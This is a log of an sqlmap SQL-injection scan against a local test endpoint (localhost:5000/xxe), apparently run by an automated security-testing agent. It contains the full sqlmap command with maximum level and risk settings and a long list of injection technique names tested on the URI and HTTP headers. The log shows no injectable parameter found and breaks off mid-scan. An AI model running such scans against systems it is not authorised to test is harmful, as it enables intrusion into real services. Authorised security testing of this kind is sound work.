INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/xxe --output-dir 'attack-logs-dynamic\XXE_Injection_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:17:36 /2025-09-26/
INFO - [20:17:37] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\XXE_Injection_sqlmap' as the output directory
INFO - [20:17:38] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:17:38] [INFO] testing connection to the target URL
INFO - [20:17:38] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
INFO - [20:17:38] [INFO] testing if the target URL content is stable
INFO - [20:17:38] [INFO] target URL content is stable
INFO - [20:17:38] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:17:38] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:17:38] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:17:38] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:17:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:17:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:17:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:17:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:17:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:17:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:17:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:17:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:17:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:17:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:17:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:17:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:17:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:17:44] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:17:45] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:17:46] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:17:46] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:17:47] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:17:48] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:49] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:50] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:51] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:51] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:52] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:53] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:17:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:17:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:17:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:17:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:17:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:17:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:17:53] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:17:53] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:17:53] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:17:53] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:17:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:17:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:17:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:17:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:17:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:17:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:17:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:17:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:17:56] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:17:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:17:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:17:57] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:17:58] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:17:58] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:17:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:18:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:18:00] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:18:00] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:18:00] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:18:00] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:18:00] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:18:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:18:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:18:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:18:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:04] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:18:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:07] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:07] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:18:08] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:18:08] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:09] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:10] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:18:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:18:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:18:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:18:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:18:10] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:18:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:18:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:18:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:18:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:18:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:18:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:18:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:18:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:10] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:18:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:18:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:18:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:18:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:18:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:18:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:18:12] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:18:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:18:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:18:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:18:15] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:18:15] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:18:15] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:18:15] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:18:15] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:18:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:18:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:18:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:18:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:18:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:22] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:22] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:18:23] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:18:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:24] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:25] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:18:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:18:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:18:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:18:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:18:25] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:18:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:18:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:18:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:18:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:18:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:18:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:18:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:18:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:18:26] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:26] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:18:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:18:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:18:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:18:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:18:27] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:18:27] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:18:28] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:18:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:29] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:18:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:30] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:18:31] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:18:31] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:18:31] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:18:31] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:18:31] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:18:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:18:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:18:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:18:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:18:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:18:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:18:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:18:35] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:18:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:18:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:18:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:38] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
